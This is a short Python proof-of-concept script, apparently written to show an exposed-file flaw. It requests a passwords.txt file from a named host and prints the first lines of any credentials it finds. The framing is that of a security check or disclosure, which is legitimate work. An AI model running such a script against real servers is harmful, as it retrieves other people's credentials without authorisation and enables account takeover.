# ============================================================
#  Author: Ifrad
#  Vulnerability: Exposed Passwords in Public Directory
#  Target: files.0x10.cloud
# ============================================================
#
#  This script connects to the target URL and attempts to read
#  a file that should be kept secret. Sensitive files like 
#  passwords.txt being publicly accessible is a major security risk,
#  as attackers can use these credentials to compromise the system.
#
# ============================================================

import urllib.request
import urllib.error
import time

target_url = "https://files.0x10.cloud/secret/passwords.txt"
print("=" * 50)
print("  Checking for Exposed Sensitive Files")
print("=" * 50)
print(f"\n  Target: {target_url}")
print("  Scanning...")

# Adding a small delay to avoid rate limiting
time.sleep(0.15)

try:
    # Attempt to fetch the secret file
    response = urllib.request.urlopen(target_url, timeout=5)
    
    # If the response is successful (HTTP 200), we can read the file
    if response.status == 200:
        content = response.read().decode('utf-8')
        print(f"\n  [!] VULNERABILITY FOUND")
        print(f"  Successfully accessed restricted file: passwords.txt")
        print(f"  Security Risk: Sensitive credentials are publicly exposed in plaintext.")
        print(f"  An attacker can use this information to gain unauthorized access.")
        print("\n  --- File Snippet ---")
        
        # Print just the first few lines to prove we have it
        lines = content.split('\n')
        for line in lines[:4]:
            if line.strip():
                print(f"  {line.strip()}")
        print("  ... (truncated for security) ...")

except urllib.error.HTTPError as e:
    # If the server properly blocks access (e.g., 403 Forbidden or 404 Not Found)
    print(f"\n  [OK] Server denied access or file not found. HTTP Status: {e.code}")
except Exception as e:
    # Catching general connection or socket errors
    print(f"\n  [ERROR] Could not connect or retrieve data: {e}")

print("\n" + "=" * 50)
